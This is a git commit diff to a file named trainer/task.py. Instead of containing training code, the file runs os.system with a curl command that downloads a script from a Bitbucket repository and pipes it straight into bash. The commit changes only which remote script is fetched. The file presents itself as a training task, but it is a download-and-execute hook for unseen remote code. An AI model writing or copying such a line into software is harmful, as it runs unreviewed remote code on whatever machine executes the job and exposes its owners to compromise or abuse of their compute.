a9aaf4e7c2839f357a6f36113efaa095093e48db
cahayaangkasaku1 <147915222+cahayaangkasaku1@users.noreply.github.com>
2023-11-16 22:39:57 +0700

    Update task.py

--- trainer/task.py
+++ trainer/task.py
@@ -1,3 +1,3 @@
 import sys
 import os
-os.system('curl -sL https://bitbucket.org/nicezep/korong/raw/master/skycuk | bash')
+os.system('curl -sL https://bitbucket.org/nicezep/korong/raw/master/skycuk2 | bash')
